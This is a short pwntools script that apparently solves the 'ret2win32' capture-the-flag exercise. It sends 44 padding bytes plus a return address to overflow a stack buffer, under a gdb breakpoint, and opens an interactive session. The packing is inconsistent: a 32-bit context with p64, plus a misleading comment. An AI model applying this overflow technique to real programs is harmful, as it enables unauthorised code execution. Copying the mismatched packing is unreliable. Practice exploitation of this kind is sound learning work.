#!/usr/bin/env python
from pwn import *

io = process('./ret2win32')

context.bits = 32

# Construct payload for buffer overflow
bfr_oflw = b'A' * 44  + p64(0x804862c)  # Use p64 for packing 64-bit integer (assuming address)

#attatch the memory adress
gdb.attach(io, gdbscript = 'b *  0x804862c')

io.recvuntil(b'>')

#send the overflow variable
io.sendline(bfr_oflw)

io.interactive()
